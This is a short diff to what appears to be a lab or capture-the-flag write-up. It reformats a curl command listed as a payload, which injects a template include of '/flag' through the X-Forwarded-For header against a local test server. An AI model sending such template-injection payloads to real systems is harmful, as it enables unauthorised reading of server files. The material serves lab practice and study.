@@ -18,9 +18,7 @@
 ## Payload
 
 ```
-curl -X GET \
-  http://127.0.0.1/xff/ \
-  -H 'X-Forwarded-For: {include file='\''/flag'\''}'
+curl -X GET http://127.0.0.1:8302/xff/ -H "X-Forwarded-For: {include file='/flag'}"
 ```
 
 ## 版权
